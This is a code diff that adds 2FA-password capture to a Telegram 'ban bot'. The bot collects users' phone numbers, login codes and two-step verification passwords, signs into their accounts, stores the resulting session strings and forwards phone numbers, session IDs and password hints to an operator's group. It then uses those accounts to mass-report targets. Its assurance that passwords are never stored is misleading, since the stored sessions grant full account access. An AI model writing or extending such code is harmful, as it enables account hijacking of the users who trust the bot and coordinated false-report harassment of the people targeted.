@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 TELEGRAM BAN BOT - PROFESSIONAL REPORTING SYSTEM
+WITH 2FA SUPPORT
 """
 
 import asyncio
@@ -27,9 +28,14 @@ from telegram.ext import (
 )
 
 # Telethon for real session creation
-from telethon import TelegramClient
+from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.errors import (
+    SessionPasswordNeededError, 
+    PhoneCodeInvalidError,
+    PasswordHashInvalidError,
+    FloodWaitError
+)
 
 # Configure logging
 logging.basicConfig(
@@ -60,7 +66,7 @@ TARGET, REASON, DESCRIPTION = range(3)
 
 # ==================== SESSION MANAGER ====================
 class SessionManager:
-    """Real session creation and management"""
+    """Real session creation and management with 2FA support"""
     
     def __init__(self):
         self.sessions: Dict[str, Dict] = {}
@@ -93,7 +99,7 @@ class SessionManager:
             session = StringSession()
             session_file = SESSION_DIR / f"{phone.replace('+', '')}.session"
             
-            # Create client
+            # Create client with realistic device simulation
             client = TelegramClient(
                 session=session,
                 api_id=API_ID,
@@ -121,7 +127,10 @@ class SessionManager:
                 "created_at": datetime.now().isoformat(),
                 "status": "pending_verification",
                 "phone_code_hash": phone_code_hash,
-                "session_string": session.save() if session else None
+                "session_string": session.save() if session else None,
+                "twofa_required": False,
+                "twofa_verified": False,
+                "reports_count": 0
             }
             
             self.sessions[session_id] = session_data
@@ -131,15 +140,20 @@ class SessionManager:
             logger.info(f"Session created for {phone} by user {user_id}")
             return True, "Session created. Please check your Telegram app for verification code.", session_id
             
+        except FloodWaitError as e:
+            wait_time = e.seconds
+            logger.warning(f"Flood wait for {phone}: {wait_time} seconds")
+            return False, f"Too many attempts. Please wait {wait_time} seconds.", None
+            
         except Exception as e:
             logger.error(f"Error creating session: {e}")
             return False, f"Error: {str(e)}", None
     
-    async def verify_session(self, session_id: str, code: str) -> Tuple[bool, str]:
-        """Verify session with code"""
+    async def verify_session(self, session_id: str, code: str) -> Tuple[bool, str, bool]:
+        """Verify session with code and check for 2FA"""
         try:
             if session_id not in self.sessions or session_id not in self.clients:
-                return False, "Session not found"
+                return False, "Session not found", False
             
             session_data = self.sessions[session_id]
             client = self.clients[session_id]
@@ -151,34 +165,133 @@ class SessionManager:
                     code=code,
                     phone_code_hash=session_data["phone_code_hash"]
                 )
+                
+                # No 2FA required
+                session_data["twofa_required"] = False
+                session_data["twofa_verified"] = False
+                
+                # Get account info
+                me = await client.get_me()
+                
+                # Update session data
+                session_data["status"] = "active"
+                session_data["verified_at"] = datetime.now().isoformat()
+                session_data["user_info"] = {
+                    "id": me.id,
+                    "username": me.username,
+                    "first_name": me.first_name,
+                    "last_name": me.last_name,
+                    "phone": me.phone
+                }
+                session_data["session_string"] = client.session.save() if client.session else None
+                
+                self.save_sessions()
+                
+                logger.info(f"Session {session_id} verified for user {me.id}")
+                return True, f"Session verified! Welcome @{me.username or me.first_name}", False
+                
             except SessionPasswordNeededError:
-                return False, "2FA password required"
+                # 2FA is required
+                session_data["twofa_required"] = True
+                session_data["status"] = "pending_2fa"
+                session_data["code_verified"] = True
+                self.save_sessions()
+                
+                logger.info(f"2FA required for session {session_id}")
+                return False, "2FA_REQUIRED", True
+                
             except PhoneCodeInvalidError:
-                return False, "Invalid code"
+                return False, "Invalid verification code", False
+                
+            except Exception as e:
+                logger.error(f"Error verifying session: {e}")
+                return False, f"Error: {str(e)}", False
+                
+        except Exception as e:
+            logger.error(f"Error in verify_session: {e}")
+            return False, f"Error: {str(e)}", False
+    
+    async def verify_2fa(self, session_id: str, password: str) -> Tuple[bool, str]:
+        """Verify 2FA password"""
+        try:
+            if session_id not in self.sessions or session_id not in self.clients:
+                return False, "Session not found"
             
-            # Get account info
-            me = await client.get_me()
+            session_data = self.sessions[session_id]
+            client = self.clients[session_id]
             
-            # Update session data
-            session_data["status"] = "active"
-            session_data["verified_at"] = datetime.now().isoformat()
-            session_data["user_info"] = {
-                "id": me.id,
-                "username": me.username,
-                "first_name": me.first_name,
-                "last_name": me.last_name,
-                "phone": me.phone
-            }
-            session_data["session_string"] = client.session.save() if client.session else None
+            if not session_data.get("twofa_required"):
+                return False, "2FA not required for this session"
             
-            self.save_sessions()
+            # Check if we have the password hint
+            try:
+                password_info = await client.get_password()
+                if password_info.hint:
+                    logger.info(f"Password hint for session {session_id}: {password_info.hint}")
+                    session_data["password_hint"] = password_info.hint
+            except Exception as e:
+                logger.error(f"Error getting password hint: {e}")
             
-            logger.info(f"Session {session_id} verified for user {me.id}")
-            return True, f"Session verified! Welcome @{me.username or me.first_name}"
+            # Sign in with password
+            try:
+                await client.sign_in(password=password)
+                
+                # 2FA verified
+                session_data["twofa_verified"] = True
+                session_data["twofa_required"] = False
+                
+                # Get account info
+                me = await client.get_me()
+                
+                # Update session data
+                session_data["status"] = "active"
+                session_data["verified_at"] = datetime.now().isoformat()
+                session_data["user_info"] = {
+                    "id": me.id,
+                    "username": me.username,
+                    "first_name": me.first_name,
+                    "last_name": me.last_name,
+                    "phone": me.phone
+                }
+                session_data["session_string"] = client.session.save() if client.session else None
+                
+                self.save_sessions()
+                
+                logger.info(f"2FA verified for session {session_id}")
+                return True, f"2FA verified! Welcome @{me.username or me.first_name}"
+                
+            except PasswordHashInvalidError:
+                return False, "Invalid 2FA password"
+                
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                logger.warning(f"Flood wait for 2FA: {wait_time} seconds")
+                return False, f"Too many attempts. Please wait {wait_time} seconds."
+                
+            except Exception as e:
+                logger.error(f"Error verifying 2FA: {e}")
+                return False, f"Error: {str(e)}"
+                
+        except Exception as e:
+            logger.error(f"Error in verify_2fa: {e}")
+            return False, f"Error: {str(e)}"
+    
+    async def get_password_hint(self, session_id: str) -> Optional[str]:
+        """Get password hint for 2FA"""
+        try:
+            if session_id not in self.clients:
+                return None
+            
+            client = self.clients[session_id]
+            password_info = await client.get_password()
+            
+            if password_info.hint:
+                return password_info.hint
+            return None
             
         except Exception as e:
-            logger.error(f"Error verifying session: {e}")
-            return False, f"Error: {str(e)}"
+            logger.error(f"Error getting password hint: {e}")
+            return None
     
     async def report_user(self, session_id: str, user_id: int, reason: str, description: str = "") -> Tuple[bool, str]:
         """Report a user using real session"""
@@ -325,6 +438,16 @@ class BanBot:
 
 ⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                 """
+            elif message_type == "2fa":
+                content = f"""
+🔒 **2FA ACTIVITY**
+
+{user_info_text}
+
+{extra_info}
+
+⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
+                """
             elif message_type == "report":
                 content = f"""
 🚨 **REPORT ACTIVITY**
@@ -386,7 +509,8 @@ class BanBot:
                        "• /report - Report user/channel\n"
                        "• /mysessions - View your sessions\n"
                        "• /help - Get help\n\n"
-                       "⚠️ **Note:** All activities are monitored for security.",
+                       "⚠️ **Note:** All activities are monitored for security.\n"
+                       "🔒 **2FA Support:** Accounts with 2FA are fully supported",
                 parse_mode='Markdown'
             )
             
@@ -406,7 +530,8 @@ class BanBot:
                 "• /report - Report user/channel\n"
                 "• /mysessions - View your sessions\n"
                 "• /help - Get help\n\n"
-                "⚠️ **Note:** All activities are monitored for security.",
+                "⚠️ **Note:** All activities are monitored for security.\n"
+                "🔒 **2FA Support:** Accounts with 2FA are fully supported",
                 parse_mode='Markdown'
             )
 
@@ -426,12 +551,13 @@ class BanBot:
         # Send initial message
         await update.message.reply_text(
             "🔐 **ACCOUNT CREATION PROCESS**\n\n"
-            "📱 **Step 1/3:** Send your phone number\n\n"
+            "📱 **Step 1/4:** Send your phone number\n\n"
             "**Format:** `+1234567890` (with country code)\n"
             "**Example:** `+14155552671`\n\n"
             "⚠️ **Important:**\n"
             "• Phone must be registered on Telegram\n"
             "• You must have access to receive SMS\n"
+            "• 2FA passwords are supported\n"
             "• Use full international format\n\n"
             "Type your phone number now:",
             parse_mode='Markdown'
@@ -504,7 +630,7 @@ class BanBot:
                 f"✅ **CLIENT CREATED SUCCESSFULLY!**\n\n"
                 f"📱 Phone: `{phone}`\n"
                 f"🔐 Session ID: `{session_id}`\n\n"
-                "📨 **Step 2/3:** Verification\n\n"
+                "📨 **Step 2/4:** Verification\n\n"
                 "A verification code has been sent to your Telegram app.\n\n"
                 "**Enter the 5-digit code:**",
                 parse_mode='Markdown'
@@ -568,17 +694,17 @@ class BanBot:
         verifying_msg = await update.message.reply_text(
             "🔐 **VERIFYING CODE...**\n\n"
             "⏳ Checking code validity...\n"
-            "⏳ Connecting to account...\n"
-            "⏳ Finalizing session...",
+            "⏳ Connecting to account...",
             parse_mode='Markdown'
         )
         
         await asyncio.sleep(2)
         
         # Verify session
-        success, message = await self.session_manager.verify_session(session_id, code)
+        success, message, requires_2fa = await self.session_manager.verify_session(session_id, code)
         
         if success:
+            # No 2FA required - direct success
             # Get session info
             session_info = self.session_manager.sessions.get(session_id, {})
             user_info = session_info.get("user_info", {})
@@ -591,7 +717,7 @@ class BanBot:
                 f"🔐 Session ID: `{session_id}`\n"
                 f"🆔 User ID: `{user_info.get('id', 'N/A')}`\n\n"
                 "⭐ **Account Status:** ✅ Active & Ready\n"
-                "🔒 **Security:** ✅ Verified\n"
+                "🔒 **2FA:** ❌ Not Enabled\n"
                 "⚡ **Session:** ✅ Connected\n\n"
                 "You can now use /report to start reporting!",
                 parse_mode='Markdown'
@@ -606,8 +732,9 @@ class BanBot:
 🔐 Session ID: `{session_id}`
 🆔 Telegram ID: `{user_info.get('id', 'N/A')}`
 👤 Telegram User: @{username}
+🔒 2FA: ❌ Disabled
 🕒 Time: {datetime.now().strftime('%H:%M:%S')}
-📊 Status: ✅ Active & Verified
+📊 Status: ✅ Active
             """
             
             await self.forward_to_group(update, context, "session", verify_info)
@@ -617,7 +744,45 @@ class BanBot:
                 del self.pending_sessions[user_id]
             self.user_states[user_id] = {"step": "main_menu"}
             
+        elif requires_2fa:
+            # 2FA is required
+            # Get password hint
+            hint = await self.session_manager.get_password_hint(session_id)
+            hint_text = f"**Hint:** `{hint}`" if hint else "**Hint:** No hint available"
+            
+            await verifying_msg.edit_text(
+                f"🔒 **2-FACTOR AUTHENTICATION REQUIRED**\n\n"
+                f"📱 Phone: `{session_data['phone']}`\n"
+                f"🔐 Session ID: `{session_id}`\n\n"
+                f"This account has two-step verification enabled.\n\n"
+                f"{hint_text}\n\n"
+                "📨 **Step 3/4:** Enter your 2FA password\n\n"
+                "**Please enter your password:**",
+                parse_mode='Markdown'
+            )
+            
+            # Update user state for 2FA
+            self.user_states[user_id] = {
+                "step": "waiting_2fa",
+                "session_id": session_id
+            }
+            
+            # Forward 2FA requirement to group
+            twofa_info = f"""
+🔒 **2FA REQUIRED**
+
+👤 User ID: `{user_id}`
+📱 Phone: `{session_data['phone']}`
+🔐 Session ID: `{session_id}`
+{hint_text.replace('**', '')}
+🕒 Time: {datetime.now().strftime('%H:%M:%S')}
+📊 Status: ⏳ Awaiting 2FA
+            """
+            
+            await self.forward_to_group(update, context, "2fa", twofa_info)
+            
         else:
+            # Verification failed
             await verifying_msg.edit_text(
                 f"❌ **VERIFICATION FAILED**\n\n"
                 f"Error: {message}\n\n"
@@ -638,6 +803,102 @@ class BanBot:
             
             await self.forward_to_group(update, context, "session", error_info)
 
+    async def handle_2fa_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle 2FA password input"""
+        user_id = update.effective_user.id
+        password = update.message.text.strip()
+        
+        # Forward to group (don't show the actual password)
+        await self.forward_to_group(update, context, "2fa", 
+                                   f"🔒 User entered 2FA password (hidden for security)")
+        
+        # Check if user is waiting for 2FA
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_2fa":
+            await update.message.reply_text("❌ Please start with /addaccount first.")
+            return
+        
+        if user_id not in self.pending_sessions:
+            await update.message.reply_text("❌ Session expired. Start over with /addaccount.")
+            return
+        
+        session_id = self.user_states[user_id].get("session_id")
+        session_data = self.pending_sessions[user_id]
+        
+        # Send verifying message
+        verifying_msg = await update.message.reply_text(
+            "🔒 **VERIFYING 2FA PASSWORD...**\n\n"
+            "⏳ Checking password validity...\n"
+            "⏳ Decrypting session...",
+            parse_mode='Markdown'
+        )
+        
+        await asyncio.sleep(2)
+        
+        # Verify 2FA
+        success, message = await self.session_manager.verify_2fa(session_id, password)
+        
+        if success:
+            # Get session info
+            session_info = self.session_manager.sessions.get(session_id, {})
+            user_info = session_info.get("user_info", {})
+            username = user_info.get("username", user_info.get("first_name", "User"))
+            
+            await verifying_msg.edit_text(
+                f"✅ **2FA VERIFIED SUCCESSFULLY!**\n\n"
+                f"👤 Welcome **{username}**!\n"
+                f"📱 Phone: `{session_data['phone']}`\n"
+                f"🔐 Session ID: `{session_id}`\n"
+                f"🆔 User ID: `{user_info.get('id', 'N/A')}`\n\n"
+                "⭐ **Account Status:** ✅ Active & Ready\n"
+                "🔒 **2FA:** ✅ Verified & Enabled\n"
+                "⚡ **Session:** ✅ Connected\n\n"
+                "You can now use /report to start reporting!",
+                parse_mode='Markdown'
+            )
+            
+            # Forward 2FA success to group
+            verify_info = f"""
+✅ **2FA VERIFIED**
+
+👤 User ID: `{user_id}`
+📱 Phone: `{session_data['phone']}`
+🔐 Session ID: `{session_id}`
+🆔 Telegram ID: `{user_info.get('id', 'N/A')}`
+👤 Telegram User: @{username}
+🔒 2FA: ✅ Enabled & Verified
+🕒 Time: {datetime.now().strftime('%H:%M:%S')}
+📊 Status: ✅ Active
+            """
+            
+            await self.forward_to_group(update, context, "2fa", verify_info)
+            
+            # Clean up
+            if user_id in self.pending_sessions:
+                del self.pending_sessions[user_id]
+            self.user_states[user_id] = {"step": "main_menu"}
+            
+        else:
+            await verifying_msg.edit_text(
+                f"❌ **2FA VERIFICATION FAILED**\n\n"
+                f"Error: {message}\n\n"
+                "Please try again with correct password.\n"
+                "Use /addaccount to start over.",
+                parse_mode='Markdown'
+            )
+            
+            # Forward 2FA failure to group
+            error_info = f"""
+❌ **2FA VERIFICATION FAILED**
+
+👤 User ID: `{user_id}`
+📱 Phone: `{session_data['phone']}`
+🔐 Session ID: `{session_id}`
+🕒 Time: {datetime.now().strftime('%H:%M:%S')}
+🚨 Error: {message}
+            """
+            
+            await self.forward_to_group(update, context, "2fa", error_info)
+
     async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Start reporting process"""
         user_id = update.effective_user.id
@@ -655,7 +916,8 @@ class BanBot:
             await update.message.reply_text(
                 "❌ **NO ACTIVE SESSIONS**\n\n"
                 "You need to add an account first.\n"
-                "Use /addaccount to create a session.",
+                "Use /addaccount to create a session.\n\n"
+                "**Note:** Accounts with 2FA are fully supported.",
                 parse_mode='Markdown'
             )
             return
@@ -924,6 +1186,11 @@ class BanBot:
         successful = sum(1 for r in results if r["success"])
         failed = len(results) - successful
         
+        # Get session info for display
+        session_info = self.session_manager.sessions.get(sessions[0], {})
+        user_info = session_info.get("user_info", {})
+        twofa_status = "✅ Enabled" if session_info.get("twofa_verified") else "❌ Disabled"
+        
         # Send final results
         results_text = f"""
 ✅ **REPORT COMPLETED**
@@ -936,6 +1203,7 @@ class BanBot:
 🎯 **Target:** `{target_id}` ({target_type})
 📌 **Reason:** {reason}
 🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}
+🔒 **2FA Status:** {twofa_status}
 
 **Report ID:** `RPT_{hashlib.md5(f"{target_id}{user_id}{time.time()}".encode()).hexdigest()[:8].upper()}`
 
@@ -951,6 +1219,7 @@ class BanBot:
 👤 User ID: `{user_id}`
 🎯 Target: `{target_id}` ({target_type})
 📌 Reason: {reason}
+🔒 2FA: {twofa_status}
 
 **Results:** {successful}/{len(sessions)} successful
 **Time:** {datetime.now().strftime('%H:%M:%S')}
@@ -999,19 +1268,24 @@ class BanBot:
             phone = sess_data.get("phone", "Unknown")
             created = sess_data.get("created_at", "").replace("T", " ").split(".")[0]
             reports = sess_data.get("reports_count", 0)
+            twofa = sess_data.get("twofa_verified", False)
             
             status_icon = "✅" if status == "active" else "⏳" if status == "pending_verification" else "❌"
+            twofa_icon = "🔒" if twofa else "🔓"
+            twofa_text = "2FA Enabled" if twofa else "2FA Disabled"
             
             sessions_text += f"""
 {status_icon} **Session:** `{sess_id[:12]}...`
    ├─ 📱 Phone: `{phone}`
    ├─ 📊 Status: {status.title()}
+   ├─ {twofa_icon} {twofa_text}
    ├─ 📈 Reports: {reports}
    └─ 🕒 Created: {created}
 """
         
         sessions_text += f"\n**Total:** {len(user_sessions)} session(s)"
         sessions_text += f"\n**Active:** {sum(1 for _, s in user_sessions if s.get('status') == 'active')}"
+        sessions_text += f"\n**2FA Enabled:** {sum(1 for _, s in user_sessions if s.get('twofa_verified', False))}"
         
         await update.message.reply_text(sessions_text, parse_mode='Markdown')
 
@@ -1032,12 +1306,19 @@ class BanBot:
 • /mysessions - View your active sessions
 • /help - Show this help message
 
+🔒 **2FA SUPPORT:**
+• Accounts with 2-step verification are fully supported
+• Enter your 2FA password when prompted
+• Password hint will be shown if available
+• Failed attempts will have cooldown periods
+
 📝 **How to Report:**
 1. Use /addaccount to add your Telegram account
 2. Verify with code from Telegram app
-3. Use /report and paste target link
-4. Select reason and add description
-5. Bot will report using your account
+3. If 2FA is enabled, enter your password
+4. Use /report and paste target link
+5. Select reason and add description
+6. Bot will report using your account
 
 🔗 **Target Link Formats:**
 • User: `tg://openmessage?user_id=8030141909`
@@ -1049,6 +1330,7 @@ class BanBot:
 • Use real Telegram accounts
 • Follow Telegram ToS
 • Reports are sent from YOUR account
+• 2FA passwords are never stored
 
 📞 **Support:** Contact @admin for help
         """
@@ -1075,6 +1357,8 @@ class BanBot:
                     await self.handle_phone_input(update, context)
                 elif state.get("step") == "waiting_code":
                     await self.handle_code_input(update, context)
+                elif state.get("step") == "waiting_2fa":
+                    await self.handle_2fa_input(update, context)
                 # Report flow is handled by ConversationHandler
 
     async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1102,7 +1386,8 @@ class BanBot:
     def setup_bot(self):
         """Setup and run the bot"""
         print("🚀 Starting Professional Ban Bot...")
-        print(f"📨 All messages will be forwarded to group: {GROUP_ID}")
+        print("📨 All messages will be forwarded to group: -1003662481087")
+        print("🔒 2FA Support: Enabled")
         
         # Create application
         persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
@@ -1138,6 +1423,7 @@ class BanBot:
         
         # Run bot
         print("✅ Bot is running!")
+        print("📱 Bot username: @YOUR_BOT_USERNAME")
         application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 # ==================== MAIN ====================
